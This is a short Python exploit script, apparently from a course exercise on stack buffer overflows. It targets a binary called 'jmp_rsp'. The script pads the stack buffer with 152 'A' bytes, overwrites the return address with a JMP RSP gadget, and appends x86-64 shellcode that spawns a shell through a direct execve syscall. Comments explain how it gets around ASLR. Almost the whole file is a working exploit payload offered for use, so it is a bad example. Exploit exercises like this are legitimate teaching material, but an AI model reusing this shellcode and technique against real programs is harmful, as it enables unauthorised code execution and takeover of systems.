#!/usr/bin/env python3

import sys

# ldd jmp_rsp (ASLR ON)
# ropper --file jmp_rsp --search "jmp rsp"
# 0x000000000040115a

# The strategy for this exploit is to first write through the entire 128-byte array buff, filling it with “A”s. We also
# write straight through the saved base pointer. The next thing to be overwritten is the saved instruction pointer, for
# which we specify the address of our “JMP RSP” gadget. Finally, we continue to write the shell code we used in
# exercise 3, which executes (“/opt/sh”). It’s important to note that the shell code uses a direct syscall, and does not
# need the address of the glibc function execve(), which itself is just a wrapper for the syscall. This exploit will work
# even in the presence of ASLR, as long as we’re allowed to execute code on the stack. The diagram below should
# serve to illustrate the attack more clearly

sys.stdout.buffer.write(b"A"*152 +
                        b"\x00\x00\x00\x00\x00\x40\x11\x5a"[::-1] +
                        b"\x48\x31\xd2\x48\xbb\x2f\x2f\x6f\x70\x74\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05");